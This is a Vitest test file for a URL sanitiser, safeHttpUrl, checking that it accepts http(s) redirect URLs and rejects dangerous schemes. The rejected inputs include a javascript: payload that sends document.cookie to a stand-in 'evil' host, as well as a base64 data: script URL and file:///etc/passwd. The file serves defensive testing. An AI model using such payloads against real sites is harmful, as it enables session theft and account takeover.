import { expect, test } from "vitest";
import { safeHttpUrl } from "../frontend/src/lib/safe-url.ts";

test.each([
    "https://app.example/callback",
    "http://localhost:3457/callback",
])("accepts http(s) redirect URLs (%s)", (url) => {
    expect(safeHttpUrl(url)?.href).toBe(url);
});

test.each([
    // The account-takeover payload from the report: parses as a URL, and
    // survives hash/searchParams mutation — must never reach a
    // window.location.href sink.
    'javascript:fetch("https://evil/"+document.cookie)',
    "javascript:alert(1)",
    "JAVASCRIPT:alert(1)",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "file:///etc/passwd",
    "vbscript:msgbox",
])("rejects executable and non-http schemes (%s)", (url) => {
    expect(safeHttpUrl(url)).toBeNull();
});

test("returns null for garbage input", () => {
    expect(safeHttpUrl("not a url")).toBeNull();
    expect(safeHttpUrl("")).toBeNull();
});
